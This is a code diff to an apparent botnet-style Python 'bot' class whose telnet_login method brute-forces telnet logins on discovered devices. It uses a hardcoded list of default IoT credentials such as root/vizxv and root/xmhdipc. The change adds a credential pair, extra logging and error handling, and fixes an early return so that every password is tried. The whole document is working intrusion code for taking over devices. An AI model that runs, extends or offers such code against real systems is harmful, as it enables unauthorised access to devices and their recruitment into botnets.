@@ -125,7 +125,7 @@ class bot:
 	def telnet_login(self, devices):
 		#keys = list(devices[0])
 		auth_entries = [
-			["root", "vizxv"], ["root", "admin"], ["root", "888888"],
+			["root", "vizxv"], ["root", "admin"], ["root", "888888"], ["admin1", "admin1"],
 			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
 			["root", "xc3511"], ["root", "vizxv"], ["root", "admin"], ["admin", "admin"], ["root", "888888"],
 			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
@@ -143,23 +143,31 @@ class bot:
 		if devices:
 			for device in devices:
 				for username, password in auth_entries:
-					print(username+": "+password)
-					with Telnet(device['ip'], timeout=1) as tn:
-						tn.read_until(b"login: ", timeout=0.5)
-						tn.write((username + '\n').encode('ascii'))
-						tn.read_until(b"Password: ", timeout=0.5)
-						tn.write((password + '\n').encode('ascii'))
-						a = tn.read_until(b"\r\n", timeout=0.5)
-						print(str(a))
-						if a == b"\r\n":
-							print('login worked!')
-							return device, auth_entries[0]
-						else:
-							print("login didn't work")
-							return None, None
+					print(">>>>>>>>>>>>>>>>>>>>>>")
+					print(device['ip'] + ":" + username+": "+password)
+					with Telnet(device['ip'], timeout=5) as tn:
+						try:
+							a = tn.read_until(b"login: ", timeout=0.5)
+							print("login: " + str(a))
+							tn.write((username + '\n').encode('ascii'))
+							a = tn.read_until(b"Password: ", timeout=0.5)
+							print("password: " + str(a))
+							tn.write((password + '\n').encode('ascii'))
+							a = tn.read_until(b"\r\n", timeout=0.5)
+							print("until: " + str(a))
+							a = tn.read_some()
+							print("some: " + str(a))
+							if "incorrect" not in str(a):
+								print('login worked!')
+								return device, auth_entries[0]
+							else:
+								print("login didn't work")
+						except Exception as err:
+							print("Error: ", err)
 		else:
 			#print("No devices found")
 			pass
+		return None, None
 
 
 def main():
